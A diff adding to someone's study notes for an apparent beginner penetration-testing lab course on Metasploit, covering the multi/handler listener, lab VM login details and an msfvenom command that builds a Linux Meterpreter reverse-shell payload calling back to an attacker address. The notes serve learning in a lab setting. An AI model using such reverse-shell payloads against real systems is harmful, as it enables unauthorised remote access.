@@ -88,6 +88,10 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
 - Choosing a working payload could become a trial and error process.
 - `msfvenom` allows you to create payloads in many different formats for many different target systems.
 - `msfvenom --list formats` - lists supported output formats
+- `use exploit/multi/handler`
+  - multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
+  - used to recieve incoming connection from payload
+    - set up handler accordingly with payload, lhost, lport of payload, same values
 - **Meterpreter** is a powerful tool that offers a lot of easy to use features during the post-exploitation phase.
 
 ### Questions
@@ -142,6 +146,9 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   hashdump
   ```
   > 8ce9a3ebd1647fcc5e04025019f4b875
-
-
+#### Task 6
+- Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
+```
 
